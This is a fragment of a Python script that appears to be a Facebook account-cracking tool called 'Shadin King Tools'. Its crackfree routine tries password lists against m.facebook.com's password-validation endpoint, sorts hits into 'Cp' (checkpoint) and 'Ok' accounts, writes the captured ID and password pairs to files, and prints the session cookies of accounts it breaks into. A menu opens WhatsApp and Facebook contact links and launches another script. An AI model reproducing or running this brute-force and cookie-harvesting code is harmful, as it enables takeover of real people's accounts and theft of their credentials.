...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Shadin.69K')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
os.system('espeak -a 300 " Welcome,   to,  Shadin,  King,  Tools"')
pass
...
def menu():
    ...
    if TUTUL in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801812775755')
        os.system("python nono.py")
    elif TUTUL in ['3','03']:
        result()
    elif TUTUL in ['0']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Shadin-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Shadin-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Shadin-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Shadin-Ok] {idf} • {pw} ')
